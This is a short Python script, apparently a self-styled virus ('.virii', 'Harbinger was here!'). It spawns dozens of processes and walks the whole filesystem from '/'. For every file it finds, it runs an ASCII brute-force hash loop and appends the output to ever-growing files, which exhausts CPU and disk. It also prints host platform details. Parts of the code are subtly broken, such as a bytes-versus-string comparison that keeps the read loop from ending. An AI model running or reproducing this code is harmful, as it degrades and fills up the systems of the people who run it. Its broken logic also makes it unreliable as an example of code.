import os,sys,functools,base64, hashlib,time, platform, threading,multiprocessing, itertools, argparse
ASCII=list()
for val in range(31,127):
    ASCII.append(chr(val))
finalAscii=''.join(ASCII)
def main(q="",prog="BakedMosquitoe.py"): 
 parser=argparse.ArgumentParser()
 parser.add_argument("-n","--ofile",action="store_true")
 parser.add_argument("-f","--file")
 options=parser.parse_args()
 file=options.file
 sepp="\n<\t|*|\t>\n========================\n<\t|*|\t>\n"
 message=list()
 message.append("tHE")
 message.append("Harbinger was here! the")
 
 with open(file,"rb") as resultFile:
  while True:
   if options.ofile == True:
    ofile=open(prog+"_cpu"+q+time.ctime()+".virii","a")
   a=""
   stuffed=""
   chunk=hashlib.sha512()
   comboH=hashlib.sha512()
   bit=12608
   result=resultFile.read(bit)
   if result != "" :
    breaker=bit
    text=[result[i:i+breaker] for i in range(0,len(result),breaker)]
    for x in text:
     #character disorienter
     for char in x:
      if char != "":
       a=a+str(char)
       a=a.replace(message[0],message[1])
       chunk.update(a.encode())
    #encode/decode data
    data=(base64.b64encode(a.encode()).decode())
    dataE=base64.b64decode(data)
    printAxel=(dataE.decode(),(sepp),(data),(sepp),(chunk.hexdigest()),(sepp),(time.ctime()),(sepp),(''.join([i for i in platform.uname()])),(sepp))
    for i in printAxel:
     print(i)
     if options.ofile == True:
      ofile.write(i)
    for i,j,k in os.walk("/"):
     for z in k:
      rTree=i+"/"+z
      rTree_h=hashlib.sha512()
      for g in rTree:
          stuffed=stuffed+str(ord(g))
      rTree_h.update(stuffed.encode())
      other=str(rTree_h.hexdigest())+sepp+rTree+sepp
      print(other)
      if options.ofile == True:
       ofile.write(other)
      for mx in range(0,6):
       for combo in itertools.combinations_with_replacement(finalAscii,mx):
        comboD=''.join(combo)
        comboH.update(comboD.encode())
        comboR=(comboD,sepp,str(comboH.hexdigest()))
        for gege in comboR:
            if options.ofile == True:
             ofile.write(gege)
             print(gege)
   else:
    if options.ofile == True:
     resultFile.close()
    break
  if options.ofile == True:
   ofile.close()

if len(sys.argv) > 1:
    a=list()
    for i in range(0,int(multiprocessing.cpu_count())*int(platform.architecture()[0].strip("bit"))):
     a.append(multiprocessing.Process(target=main,args=(str(i),)))
     a[i].start()
     a[i].join(0.5)
